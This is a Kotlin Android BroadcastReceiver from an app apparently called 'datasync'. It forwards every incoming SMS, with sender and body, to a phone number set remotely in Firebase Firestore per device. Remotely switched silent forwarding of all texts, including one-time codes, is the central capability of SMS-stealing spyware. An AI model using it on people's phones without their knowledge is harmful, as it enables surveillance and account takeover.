package com.boxx.datasync.sync

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import com.boxx.datasync.domain.model.SmsForwardingConfig
import com.boxx.datasync.utils.DeviceIdHelper
import com.google.firebase.firestore.FirebaseFirestore
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await

class SmsForwardingReceiver : BroadcastReceiver() {
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != "android.provider.Telephony.SMS_RECEIVED") return

        val deviceId = DeviceIdHelper.getDeviceId(context)
        if (deviceId.isBlank()) return

        val pendingResult = goAsync()
        scope.launch {
            try {
                val db = FirebaseFirestore.getInstance()
                val snapshot = db.collection("devices")
                    .document(deviceId)
                    .collection("settings")
                    .document("smsForwarding")
                    .get()
                    .await()

                val config = snapshot.toObject(SmsForwardingConfig::class.java)
                if (config != null && config.enabled && config.destinationNumber.isNotBlank()) {
                    val bundle = intent.extras
                    val pdus = bundle?.get("pdus") as? Array<*>
                    if (pdus != null) {
                        val format = bundle.getString("format")
                        for (pdu in pdus) {
                            val sms = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                                SmsMessage.createFromPdu(pdu as ByteArray, format)
                            } else {
                                @Suppress("DEPRECATION")
                                SmsMessage.createFromPdu(pdu as ByteArray)
                            }
                            val sender = sms.originatingAddress
                            val body = sms.messageBody
                            val forwardMessage = "Fwd from $sender: $body"

                            forwardSms(context, config.destinationNumber, forwardMessage, config.simSlot)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("SmsForwardingReceiver", "Error in SMS forwarding", e)
            } finally {
                pendingResult.finish()
            }
        }
    }

    private fun forwardSms(context: Context, number: String, message: String, simSlot: Int) {
        if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.e("SmsForwardingReceiver", "SMS_FORWARDING_FAILED: Missing SEND_SMS permission")
            return
        }
        try {
            val smsManager = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                val subscriptionManager = context.getSystemService(android.telephony.SubscriptionManager::class.java)
                val info = subscriptionManager.activeSubscriptionInfoList?.find { it.simSlotIndex == (simSlot - 1) }
                if (info != null) {
                    context.getSystemService(android.telephony.SmsManager::class.java).createForSubscriptionId(info.subscriptionId)
                } else {
                    context.getSystemService(android.telephony.SmsManager::class.java)
                }
            } else {
                @Suppress("DEPRECATION")
                android.telephony.SmsManager.getDefault()
            }
            smsManager.sendTextMessage(number, null, message, null, null)
            Log.d("SmsForwardingReceiver", "SMS_FORWARDING_SENT")
        } catch (e: Exception) {
            Log.e("SmsForwardingReceiver", "SMS_FORWARDING_FAILED", e)
        }
    }
}
